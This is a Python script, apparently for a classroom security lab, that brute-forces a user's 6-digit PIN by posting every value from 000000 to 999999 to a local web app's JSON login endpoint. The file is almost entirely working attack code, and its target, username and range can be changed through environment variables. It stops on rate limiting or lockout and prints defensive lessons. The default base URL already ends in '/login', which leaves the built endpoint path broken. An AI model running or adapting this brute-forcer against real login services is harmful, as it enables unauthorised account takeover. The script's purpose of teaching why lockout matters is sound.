"""

INSTAGROM Classroom Brute-Force Demonstration Script
=====================================================
This script is strictly for educational purposes in a controlled classroom lab.
It demonstrates why 6-digit numeric PINs with NO rate limiting or lockout
are vulnerable to exhaustive keyspace search (1,000,000 possibilities: 000000-999999).

KEY DIFFERENCE from older scripts (BruteForce.py / BruteForce1.py):
  - Old scripts posted form-data to /login and watched for a 302 redirect.
  - This script correctly targets the REAL Instagrom Next.js API:
      POST /api/auth/login
      Content-Type: application/json
      Body: {"username": "...", "password": "..."}
      Success signal: HTTP 200 + JSON body containing "success": true

"""

import os
import json
import time
import urllib.request
import urllib.error

# ---------------------------------------------------------------------------
# Configuration  (override via environment variables)
# ---------------------------------------------------------------------------
BASE_URL        = os.environ.get("BASE_URL",        "http://192.168.56.1:3000/login")
TARGET_USERNAME = os.environ.get("TARGET_USERNAME", "albert")
PIN_START       = int(os.environ.get("PIN_START",   "0"))        # inclusive
PIN_END         = int(os.environ.get("PIN_END",     "999999"))   # inclusive
PROGRESS_EVERY  = int(os.environ.get("PROGRESS_EVERY", "5000"))  # print every N attempts

LOGIN_ENDPOINT  = f"{BASE_URL.rstrip('/')}/api/auth/login"

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
print("=" * 65)
print("  INSTAGROM CLASSROOM BRUTE-FORCE DEMO  (JSON API edition)")
print(f"  Endpoint  : POST {LOGIN_ENDPOINT}")
print(f"  Username  : {TARGET_USERNAME}")
print(f"  PIN range : {PIN_START:06d} -> {PIN_END:06d}"
      f"  ({PIN_END - PIN_START + 1:,} combinations)")
print("  Success   : HTTP 200 + {\"success\": true}")
print("=" * 65)

# ---------------------------------------------------------------------------
# Attack loop
# ---------------------------------------------------------------------------
start_time = time.time()
attempts   = 0
found_pin  = None
was_locked = False

for pin_num in range(PIN_START, PIN_END + 1):
    pin = f"{pin_num:06d}"
    attempts += 1

    # Build JSON request
    payload = json.dumps({"username": TARGET_USERNAME, "password": pin}).encode("utf-8")
    req = urllib.request.Request(
        LOGIN_ENDPOINT,
        data=payload,
        method="POST",
        headers={"Content-Type": "application/json"},
    )

    try:
        with urllib.request.urlopen(req) as resp:
            body = resp.read().decode("utf-8", errors="ignore")

            # HTTP 200 received — check JSON payload
            if resp.status == 200:
                try:
                    data = json.loads(body)
                except json.JSONDecodeError:
                    data = {}

                if data.get("success") is True:
                    found_pin = pin
                    break

                # Lockout message embedded in a 200 response
                if "temporarily locked" in body.lower() or "locked" in body.lower():
                    was_locked = True
                    break

    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="ignore")
        except Exception:
            pass

        if e.code == 429:
            # Rate-limited — defense is working
            print(f"\n[!] HTTP 429 Too Many Requests received after {attempts} attempts.")
            print("    Rate-limiting / lockout defense is ACTIVE. Attack stopped.")
            was_locked = True
            break

        if "temporarily locked" in body.lower() or "locked" in body.lower():
            was_locked = True
            break

        # 400 / 401 / 500 = wrong PIN, continue silently

    except urllib.error.URLError as e:
        print(f"\n[-] Cannot connect to {LOGIN_ENDPOINT}")
        print(f"    Reason: {e.reason}")
        print("    Make sure Instagrom is running  (`npm run dev`  or  `npm start`).")
        break

    # Progress report
    if attempts % PROGRESS_EVERY == 0:
        elapsed = time.time() - start_time
        rate    = attempts / elapsed if elapsed > 0 else 0
        print(f"[*] {attempts:>7,} PINs tested  |  current: {pin}  |  {rate:,.1f} req/s")

# ---------------------------------------------------------------------------
# Result
# ---------------------------------------------------------------------------
elapsed = time.time() - start_time
print("=" * 65)

if was_locked:
    print(f"[!] DEFENSE ACTIVE — account '{TARGET_USERNAME}' was locked/rate-limited")
    print(f"    after {attempts:,} attempt(s)  ({elapsed:.2f} s).")
    print("[+] Classroom takeaway: Lockout / rate-limiting defeats brute-force!")

elif found_pin:
    print(f"[+] SUCCESS!  PIN for '{TARGET_USERNAME}' is: {found_pin}")
    print(f"    Total attempts : {attempts:,}")
    print(f"    Elapsed time   : {elapsed:.2f} s  ({attempts / elapsed:,.1f} req/s)")
    print("[+] Classroom takeaway: 6-digit PINs with no lockout are crackable!")

else:
    print("[-] PIN not found in the specified range, or server was unreachable.")

print("=" * 65)
